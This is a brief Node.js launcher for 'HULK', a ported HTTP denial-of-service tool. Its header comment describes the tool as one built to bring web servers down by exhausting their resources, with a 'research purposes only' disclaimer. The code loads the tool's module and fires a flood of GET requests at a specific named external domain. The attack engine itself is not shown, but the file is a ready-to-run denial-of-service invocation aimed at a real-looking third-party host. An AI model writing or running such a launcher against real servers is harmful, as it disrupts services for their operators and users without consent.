/*
		HULK v1.0.0
	https://github.com/siarheidudko/hulk
	(c) 2018 by Siarhei Dudko.
	https://github.com/siarheidudko/hulk/LICENSE
	
	Quotation of the original file:
	"This tool is a dos tool that is meant to put heavy load on HTTP servers in 
	order to bring them to their knees by exhausting the resource pool, 
	its is meant for research purposes only and any malicious usage of this tool is prohibited."
	Originaly (python) author :  Barry Shteiman - http://www.sectorix.com/2012/05/17/hulk-web-server-dos-tool/
	
	Rewritten with python (concept) under nodejs, optimized by Siarhei Dudko
	
*/

"use strict"

var hulk = require(__dirname + '/index.js');

hulk.core('http://alenmoroz.tk/', '', 'GET', 5, 100);